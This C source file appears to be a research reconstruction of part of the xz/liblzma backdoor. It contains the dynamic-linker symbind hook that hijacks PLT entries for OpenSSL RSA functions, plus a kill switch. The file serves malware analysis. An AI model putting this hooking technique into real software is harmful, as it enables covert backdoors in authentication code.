/**
 * Copyright (C) 2024 Stefano Moioli <smxdev4@gmail.com>
 **/
#include "xzre.h"
#include <elf.h>

#define PLT_VALID(x) (UPTR(x) > 0xFFFFFF)

uintptr_t backdoor_symbind64(
	Elf64_Sym *sym,
	unsigned int ndx,
	uptr *refcook, uptr *defcook,
	unsigned int flags,
	const char *symname
)
{
	imported_funcs_t *funcs = &hooks_data->imported_funcs;
	ldso_ctx_t *ldso = &hooks_data->ldso_ctx;

	if(ldso->hooks_installed){
		goto orig;
	}

	void *retaddr = __builtin_return_address(0);

	void *_dl_audit_symbind_alt = ldso->_dl_audit_symbind_alt;
	void *__libc_stack_end = hooks_data->libc_imports.__libc_stack_end;

	#define HOOK_INSTALL(orig, plt, hook) do { \
		(orig) = *(plt); \
		*(plt) = (hook); \
		/* updates the symbol if it's in ldso scope? */ \
		if(UPTR(sym) > UPTR(retaddr) && UPTR(sym) < UPTR(__libc_stack_end)) \
			sym->st_value = (Elf64_Addr)(hook); \
	} while(0)

	// trigger kill switch if the call site is not in ldso region
	if(retaddr <= _dl_audit_symbind_alt) goto kill_switch;

	uintptr_t func_end_addr = PTRADD(_dl_audit_symbind_alt, hooks_data->ldso_ctx._dl_audit_symbind_alt);
	uintptr_t offset_in_function = PTRDIFF(retaddr, _dl_audit_symbind_alt);
	if(offset_in_function > func_end_addr) goto kill_switch;

	EncodedStringId string_id = get_string_id(symname, NULL);
	BOOL plt_entry_valid;

	/**
	 * only one of the following hooks will be installed (the first that passes the checks).
	 * the other ones are fallbacks (alternative entry points) in case the first one doesn't hit.
	 */

	if(string_id == STR_RSA_public_decrypt && funcs->RSA_public_decrypt_plt){
		if(PLT_VALID(*funcs->RSA_public_decrypt_plt)){
			HOOK_INSTALL(
				funcs->RSA_public_decrypt,
				funcs->RSA_public_decrypt_plt,
				ldso->hook_RSA_public_decrypt
			);
		}
		// RSA_public_decrypt is "standalone" (doesn't need further hooks)
		goto symbind_reset;
	} else if(string_id == STR_EVP_PKEY_set1_RSA && funcs->EVP_PKEY_set1_RSA_plt){
		if(PLT_VALID(*funcs->EVP_PKEY_set1_RSA_plt)){
			HOOK_INSTALL(
				funcs->EVP_PKEY_set1_RSA,
				funcs->EVP_PKEY_set1_RSA_plt,
				ldso->hook_EVP_PKEY_set1_RSA
			);

			// EVP_PKEY_set1_RSA depends on RSA_get0_key to be also hooked
			if(!funcs->RSA_get0_key_plt) {
				goto symbind_reset;
			}
			plt_entry_valid = PLT_VALID(*funcs->RSA_get0_key_plt);
		}
	} else if(string_id == STR_RSA_get0_key && funcs->RSA_get0_key_plt){
		if(PLT_VALID(*funcs->RSA_get0_key_plt)){
			HOOK_INSTALL(
				// ??
				funcs->RSA_get0_key_null,
				funcs->RSA_get0_key_plt,
				ldso->hook_RSA_get0_key
			);
			// RSA_get0_key depends on EVP_PKEY_set1_RSA to be also hooked
			if(!funcs->EVP_PKEY_set1_RSA_plt){
				goto symbind_reset;
			}
			plt_entry_valid = PLT_VALID(*funcs->EVP_PKEY_set1_RSA_plt);
		}
	} else {
		goto orig;
	}

	/** if the hook has been installed successfully */
	if(plt_entry_valid){
		symbind_reset:	
		init_ldso_ctx(&hooks_data->ldso_ctx);

		kill_switch:
		hooks_data->ldso_ctx.hooks_installed = TRUE;
	}

	orig:
	return sym->st_value;

	#undef HOOK_INSTALL
}